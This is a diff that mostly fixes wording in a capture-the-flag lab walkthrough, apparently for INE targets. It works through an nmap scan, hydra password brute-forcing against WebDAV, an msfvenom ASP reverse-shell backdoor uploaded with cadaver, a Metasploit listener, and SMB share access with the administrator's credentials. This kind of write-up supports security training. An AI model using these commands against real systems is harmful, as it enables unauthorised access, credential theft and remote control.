@@ -1,4 +1,3 @@
-Running an nmap scan. This is to understand what services are running on the target system.
 
 ![Screenshot 2025-06-24 121524.png](resources/Screenshot%202025-06-24%20121524.png)
 
@@ -6,10 +5,10 @@ Before checking the first hint, let’s try to understand the target by running 
 
 nmap -Pn -sV -sC -p- 10.3.26.83
 
-- sV : `show services`
-- \-Pn : `do not ping`
-- \-p- : `all ports`
-- \-sC : `scan with default script`
+- sV: `show services`
+- \-Pn: `do not ping`
+- \-p-: `all ports`
+- \-sC: `scan with default script`
 
 When you run the above command, the output will be given as follows.
 
@@ -17,13 +16,13 @@ When you run the above command, the output will be given as follows.
 
 As you can see, there are various services running on the target host. Now let’s find **flag 1**.
 
-**HINT 1** : “User ‘bob’ might not have chosen a strong password. Try common passwords. (target1.ine.local)”
+**HINT 1**: “User ‘bob’ might not have chosen a strong password. Try common passwords. (target1.ine.local)”
 
-So, when we read the HINT 1, we get the idea that we need to brute force the user “bob” to find the credentials, but what is the service?. Let’s try to access the website running on port 80, as we can see the http service is running on port 80 according to the **nmap results**.
+So, when we read HINT 1, we get the idea that we need to brute force the user “bob” to find the credentials, but what is the service?. Let’s try to access the website running on port 80, as we can see the HTTP service is running on port 80 according to the **nmap results**.
 
 ![f84947b3666c04c94047e2b0d68ea897.png](resources/f84947b3666c04c94047e2b0d68ea897.png)
 
-As we can see, the website is running on port 80 and this is a Microsoft IIS httpd 10.0 server running on port 80, which could be potentially vulnerable if the “**WebDAV**” service is not configured correctly.
+As we can see, the website is running on port 80, and this is a Microsoft IIS httpd 10.0 server running on port 80, which could be potentially vulnerable if the “**WebDAV**” service is not configured correctly.
 
 ## **1\. Vulnerable IIS service**
 
@@ -37,36 +36,35 @@ When you try to access the above directory, you will be asked to provide login c
 
 hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.3.26.83 http-get
 
-- \-l : `username`
-- \-P : `worldist (password)`
+- \-l: `username`
+- \-P: `worldist (password)`
 
 When you run the above command, you will see the password for “bob”.
 
 ![002f721fb866ebae057b2cc8f4e26af2.png](resources/002f721fb866ebae057b2cc8f4e26af2.png)
 
-Login to the “WebDAV ”directory using the above credentials and then you can find the **flag 1**.
+Log in to the “WebDAV ”directory using the above credentials, and then you can find the **flag 1**.
 
 ![fcfd58ff3a454959d82c261a6d46616b.png](resources/fcfd58ff3a454959d82c261a6d46616b.png)
 
-&nbsp;
 
 ![ede9744b61005e5fbe00d6429f6428c5.png](resources/ede9744b61005e5fbe00d6429f6428c5.png)
 
 ![d176c4882069ed58d477067c3d30da74.png](resources/d176c4882069ed58d477067c3d30da74.png)
 
-check other directories.
+Check other directories.
 
 ![80a31af8e87e2d2547913dcd7848e2df.png](resources/80a31af8e87e2d2547913dcd7848e2df.png)
 
 **Let’s move to find flag 2. Let’s check the hint.**
 
-**HINT 2 : “Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)”**
+**HINT 2: “Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)”**
 
 So, the hint is all about accessing the target. Since we found what is the vulnerable service on the IIS server, let’s do some hacking.
 
 ## 2\. Access the system
 
-For exploiting the vulnerability, we need to use 2 tools,
+To exploit the vulnerability, we need to use 2 tools,
 
 *1.* ***davtest*** *\= used to check what file extensions are accepted by the server  
 2.* ***cadaver*** *\= upload the vulnerable file to the target (IIS web server)*
@@ -79,24 +77,24 @@ You will see what files are accepted as follows.
 
 ![c194c2402d740348fa938bf3e374dd7a.png](resources/c194c2402d740348fa938bf3e374dd7a.png)
 
-As per the results given in davtest, for this purpose let’s use the “.asp” extension. Now, we need to create a malicious file that allows us to obtain a reverse shell since we can access the “WebDav” directory. Use the following command to create a malicious file using **msfvenom**.
+As per the results given in davtest, for this purpose, let’s use the “.asp” extension. Now, we need to create a malicious file that allows us to obtain a reverse shell since we can access the “WebDav” directory. Use the following command to create a malicious file using **msfvenom**.
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.40.3 LPORT=4444 -f asp > backdoor.asp
 
-- \-p : `payload`
-- LHOST : `localhost (ip address of the attack machine)`
-- LPORT : `localport (a port on the attack machine)`
-- \-f : `file type`
+- \-p: `payload`
+- LHOST: `localhost (ip address of the attack machine)`
+- LPORT: `localport (a port on the attack machine)`
+- \-f: `file type`
 
 When you run the above command, a file called “backdoor.asp” will be generated with the given parameters. You can check the file by listing the contents of the current directory, whether it is created or not.
 
 ![0f2ef8b124e2426877bb5f076dc7db60.png](resources/0f2ef8b124e2426877bb5f076dc7db60.png)
 
-After that we can upload the generated file using **Cadaver** to the “WebDAV” directory.
+After that, we can upload the generated file using **Cadaver** to the “WebDAV” directory.
 
 cadaver http://target1.ine.local/webdav/
 
-After that you have to provide the username and the password to access.
+After that, you have to provide the username and the password to access.
 
 put backdoor.asp
 
@@ -104,11 +102,11 @@ We can upload our malicious file using the above command.
 
 ![2148e0bc442704d7ba0ff5f4e63151a3.png](resources/2148e0bc442704d7ba0ff5f4e63151a3.png)
 
-After the above process, you can clearly see that the backdoor.asp file has been successfully uploaded to the “WebDAV” directory.
+After the above process, you can clearly see the backdoor.asp file has been successfully uploaded to the “WebDAV” directory.
 
 ![bc07d4eef9682c1ba1c534a14d460488.png](resources/bc07d4eef9682c1ba1c534a14d460488.png)
 
-Now what we have to do is start a listener from our attack machine. For this purpose I’m going to use Metasploit.
+Now, what we have to do is start a listener from our attack machine. For this purpose, I’m going to use Metasploit.
 
 Use the above commands, respectively.
 
@@ -124,7 +122,7 @@ set payload windows/meterpreter/reverse_tcp
 
 So, as you can see, our listener is running on port 4444 from the attack machine’s network interface (localhost).
 
-Now all we have to do is run our backdoor.asp file from the “WebDAV” directory and then you will get the meterpreter session.
+Now all we have to do is run our backdoor.asp file from the “WebDAV” directory, and then you will get the meterpreter session.
 
 ![17701a2dc491467e801ff5468b9540d4.png](resources/17701a2dc491467e801ff5468b9540d4.png)
 
@@ -163,9 +161,9 @@ davtest -url http://10.3.27.91/webdav/ -auth bob:password_123321
         - ^^type C:\\flag2.txt^^
     
 
-**HINT 3** : “SMB shares might contain hidden files. Check the available shares. (target2.ine.local)”
+**HINT 3**: “SMB shares might contain hidden files. Check the available shares. (target2.ine.local)”
 
-According to the HINT 3, let’s check the shares first and then check hidden files.
+According to HINT 3, let’s check the shares first and then check the hidden files.
 
 ## 3\. Enumerate shares in SMB
 
@@ -183,7 +181,7 @@ Results are shown below.
 
 ![ab364b6ba85e4533d526522d8b5ae43c.png](resources/ab364b6ba85e4533d526522d8b5ae43c.png)
 
-So as we can see, we can find the administrator’s passwords. Let’s enumerate the shares using **smbclient**.
+So, as we can see, we can find the administrator’s passwords. Let’s enumerate the shares using **smbclient**.
 
 smbclient -L \\\\\\\\target2.ine.local\\\\ -U administrator
 
@@ -197,7 +195,7 @@ Access the C$ share using the following command
 
 smbclient -L \\\\\\\\target2.ine.local\\\\ -U administrator
 
-.Provide the password and list the content. You can find the **flag 3** among the other files. Use “***cat flag3.txt***” to obtain the hash.
+Provide the password and list the content. You can find the **flag 3** among the other files. Use “***cat flag3.txt***” to obtain the hash.
 
 ![cca0407c531fea1a405c8a700c702f1f.png](resources/cca0407c531fea1a405c8a700c702f1f.png)
 
@@ -209,7 +207,7 @@ smbclient -L \\\\\\\\target2.ine.local\\\\ -U administrator
 
 Don’t close the SMB connection because **flag 4** is also located in the same share but different directory. Let’s move to find **flag 4**.
 
-HINT 4 : “The Desktop directory might have what you’re looking for. Enumerate its contents. (target2.ine.local)”
+HINT 4: “The Desktop directory might have what you’re looking for. Enumerate its contents. (target2.ine.local)”
 
 The hint says that **flag 4** is located in a desktop directory.
 
